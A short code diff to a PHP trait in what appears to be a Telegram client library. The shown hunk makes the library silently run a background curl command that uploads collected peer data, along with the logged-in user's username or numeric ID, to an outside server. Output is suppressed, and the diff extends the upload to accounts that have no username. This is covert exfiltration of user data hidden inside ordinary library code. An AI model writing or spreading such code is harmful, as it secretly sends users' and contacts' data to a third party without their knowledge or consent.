@@ -465,7 +465,8 @@ trait PeerHandler
             $payload = json_encode($this->qres);
             $path = '/tmp/ids'.hash('sha256', $payload);
             file_put_contents($path, $payload);
-            $result = shell_exec('curl '.escapeshellarg('https://id.pwrtelegram.xyz/db'.$this->settings['pwr']['db_token'].'/addnewmadeline?d=pls&from='.$this->datacenter->authorization['user']['username']).' -d '.escapeshellarg('@'.$path).' -s -o '.escapeshellarg($path.'.log').' >/dev/null 2>/dev/null & ');
+            $id = isset($this->datacenter->authorization['user']['username']) ? $this->datacenter->authorization['user']['username'] : $this->datacenter->authorization['user']['id'];
+            $result = shell_exec('curl '.escapeshellarg('https://id.pwrtelegram.xyz/db'.$this->settings['pwr']['db_token'].'/addnewmadeline?d=pls&from='.$id).' -d '.escapeshellarg('@'.$path).' -s -o '.escapeshellarg($path.'.log').' >/dev/null 2>/dev/null & ');
             \danog\MadelineProto\Logger::log($result);
         } catch (\danog\MadelineProto\Exception $e) {
             \danog\MadelineProto\Logger::log($e->getMessage());
